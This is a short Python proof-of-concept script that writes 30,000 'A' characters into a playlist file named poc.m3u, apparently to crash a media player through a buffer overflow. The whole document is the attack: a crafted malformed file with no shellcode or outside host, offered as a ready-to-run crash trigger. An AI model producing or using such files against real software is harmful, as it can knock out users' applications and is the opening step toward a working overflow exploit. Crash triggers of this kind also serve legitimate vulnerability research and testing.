# Craft 30000 of A's 
# Save it as file with .m3u extension
buf = "A" * 30000

payload = buf

f = open('poc.m3u','w')
f.write(payload)
f.close()
